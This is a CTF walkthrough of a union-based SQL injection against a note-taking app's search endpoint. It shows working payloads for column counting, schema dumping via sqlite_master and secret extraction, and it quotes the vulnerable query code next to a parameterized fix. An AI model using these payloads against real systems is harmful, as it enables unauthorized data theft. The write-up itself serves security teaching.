---
title: "SQL Injection — Union-Based Extraction"
date: 2026-02-12
description: "Walkthrough of a CTF challenge exploiting union-based SQL injection to dump the database"
tags: ["ctf", "sqli", "web"]
weight: 1
---

## Challenge: SecureNotes v2

> Category: Web | Points: 300 | Solves: 42

A note-taking app with a search feature. The goal is to extract the admin's secret note.

## Reconnaissance

The search endpoint:

```
GET /api/search?q=test
```

Returns JSON:
```json
{"results": [{"id": 1, "title": "test note", "preview": "..."}]}
```

## Finding the Injection Point

Appending a single quote causes a 500 error:

```
GET /api/search?q=test'
→ 500 Internal Server Error
```

Double quote works fine → likely SQL string context with single quotes.

## Determining Column Count

```sql
' ORDER BY 1-- → 200 OK
' ORDER BY 2-- → 200 OK
' ORDER BY 3-- → 200 OK
' ORDER BY 4-- → 500 Error
```

3 columns: `id`, `title`, `preview`.

## Union-Based Extraction

```sql
' UNION SELECT 1,sqlite_version(),3--
```

Response reveals SQLite 3.40.1.

### Dumping Tables

```sql
' UNION SELECT 1,name,sql FROM sqlite_master WHERE type='table'--
```

Found tables: `users`, `notes`, `secret_notes`.

### Extracting the Flag

```sql
' UNION SELECT 1,content,3 FROM secret_notes WHERE user_id=1--
```

```
FLAG{un10n_b4s3d_sqli_1s_cl4ss1c}
```

## Remediation

The vulnerable code:
```python
# VULNERABLE
query = f"SELECT id, title, preview FROM notes WHERE title LIKE '%{search}%'"

# FIXED — parameterized query
query = "SELECT id, title, preview FROM notes WHERE title LIKE ?"
cursor.execute(query, (f"%{search}%",))
```

## Takeaways

- Always use parameterized queries
- Error messages revealed the DB engine (SQLite)
- `ORDER BY` is the fastest way to find column count
